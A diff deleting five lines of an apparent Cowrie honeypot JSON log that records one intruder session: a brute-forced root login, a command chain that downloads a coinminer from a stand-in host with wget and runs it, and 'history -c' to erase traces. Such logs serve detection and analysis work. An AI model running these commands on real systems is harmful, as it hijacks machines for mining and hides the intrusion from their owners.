@@ -1,5 +1,0 @@
-{"eventid":"cowrie.session.connect", "session":"s111", "timestamp":"2026-09-17T10:00:00Z", "src_ip":"185.220.101.5"}
-{"eventid":"cowrie.login.failed", "session":"s111", "timestamp":"2026-09-17T10:00:02Z", "src_ip":"185.220.101.5", "username":"admin", "password":"123"}
-{"eventid":"cowrie.login.success", "session":"s111", "timestamp":"2026-09-17T10:00:05Z", "src_ip":"185.220.101.5", "username":"root", "password":"password123"}
-{"eventid":"cowrie.command.input", "session":"s111", "timestamp":"2026-09-17T10:00:10Z", "src_ip":"185.220.101.5", "input":"cd /tmp; wget http://malware.com/coinminer; chmod +x coinminer; ./coinminer"}
-{"eventid":"cowrie.command.input", "session":"s111", "timestamp":"2026-09-17T10:00:15Z", "src_ip":"185.220.101.5", "input":"history -c"}
